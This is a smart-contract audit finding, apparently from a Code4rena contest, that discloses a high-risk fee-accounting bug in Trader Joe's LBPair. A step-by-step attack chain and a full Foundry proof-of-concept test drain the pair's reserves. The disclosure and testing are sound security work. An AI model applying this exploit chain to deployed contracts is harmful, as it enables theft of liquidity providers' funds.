## Tags

- bug
- 3 (High Risk)
- primary issue
- sponsor confirmed
- selected for report
- H-05

# [Attacker can steal entire reserves by abusing fee calculation](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423) 

# Lines of code

https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829
https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202


# Vulnerability details

## Description

Similar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:

```
    function _getPendingFees(
        Bin memory _bin,
        address _account,
        uint256 _id,
        uint256 _balance
    ) private view returns (uint256 amountX, uint256 amountY) {
        Debts memory _debts = _accruedDebts[_account][_id];

        amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;
        amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;
    }
```

accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.

When liquidity is first minted to user, the \_accruedDebts is updated to match current \_balance * accToken\*PerShare. Without this step, user could collect fees for the entire growth of accToken\*PerShare from zero to current value. This is done in \_updateUserDebts, called by \_cacheFees() which is called by \_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.

```
    function _updateUserDebts(
        Bin memory _bin,
        address _account,
        uint256 _id,
        uint256 _balance
    ) private {
        uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);
        uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);

        _accruedDebts[_account][_id].debtX = _debtX;
        _accruedDebts[_account][_id].debtY = _debtY;
    }
```

The critical problem lies in \_beforeTokenTransfer:

```
if (_from != _to) {
    if (_from != address(0) && _from != address(this)) {
        uint256 _balanceFrom = balanceOf(_from, _id);
        _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);
    }
    if (_to != address(0) && _to != address(this)) {
        uint256 _balanceTo = balanceOf(_to, _id);
        _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);
    }
}
```

Note that if \_from or \_to is the LBPair contract itself, \_cacheFees won't be called on \_from or \_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn. 

This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken\*PerShare value.

We can exploit this bug to collect the entire reserve assets. The attack flow is:
- Transfer amount X to pair
- Call pair.mint(), with the to address = pair address
- call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work
- Pair will now think user sent in money, because the bookkeeping is wrong. \_pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:
```
uint256 _amountIn = _swapForY
    ? tokenX.received(_pair.reserveX, _pair.feesX.total)
    : tokenY.received(_pair.reserveY, _pair.feesY.total);
```
- Attacker calls swap() and receives reserve assets using the fees collected.
- Attacker calls burn(), passing their own address in \_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.

Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:
```
if (amountX != 0) {
    _pairInformation.feesX.total -= uint128(amountX);
}
if (amountY != 0) {
    _pairInformation.feesY.total -= uint128(amountY);
}
```

If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.

## Impact

Attacker can steal the entire reserves of the LBPair.

## Proof of Concept

Paste this test in LBPair.Fees.t.sol:

```
    function testAttackerStealsReserve() public {
        uint256 amountY=  53333333333333331968;
        uint256 amountX = 100000;

        uint256 amountYInLiquidity = 100e18;
        uint256 totalFeesFromGetSwapX;
        uint256 totalFeesFromGetSwapY;

        addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);
        uint256 id;
        (,,id ) = pair.getReservesAndId();
        console.log("id before" , id);

        //swap X -> Y and accrue X fees
        (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);
        totalFeesFromGetSwapX += feesXFromGetSwap;

        token6D.mint(address(pair), amountXInForSwap);
        vm.prank(ALICE);
        pair.swap(true, DEV);
        (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();

        (,,id ) = pair.getReservesAndId();
        console.log("id after" , id);


        console.log("Bob balance:");
        console.log(token6D.balanceOf(BOB));
        console.log(token18D.balanceOf(BOB));
        console.log("-------------");

        uint256 amount0In = 100e18;

        uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);
        uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);
        uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);

        console.log("Minting for BOB:");
        console.log(amount0In);
        console.log("-------------");

        token6D.mint(address(pair), amount0In);
        //token18D.mint(address(pair), amount1In);
        pair.mint(_ids, _distributionX, _distributionY, address(pair));
        uint256[] memory amounts = new uint256[](1);
        console.log("***");
        for (uint256 i; i < 1; i++) {
            amounts[i] = pair.balanceOf(address(pair), _ids[i]);
            console.log(amounts[i]);
        }
        uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;
        (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);
        console.log("profit x", profit_X);
        console.log("profit y", profit_Y);
        pair.collectFees(address(pair), profit_ids);
        (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);

        console.log("swap x", swap_x);
        console.log("swap y", swap_y);

        console.log("Bob balance after swap:");
        console.log(token6D.balanceOf(BOB));
        console.log(token18D.balanceOf(BOB));
        console.log("-------------");

        console.log("*****");
        pair.burn(_ids, amounts, BOB);


        console.log("Bob balance after burn:");
        console.log(token6D.balanceOf(BOB));
        console.log(token18D.balanceOf(BOB));
        console.log("-------------");

    }
```


## Tools Used

Manual audit, foundry

## Recommended Mitigation Steps

Code should not exempt any address from \_cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them. 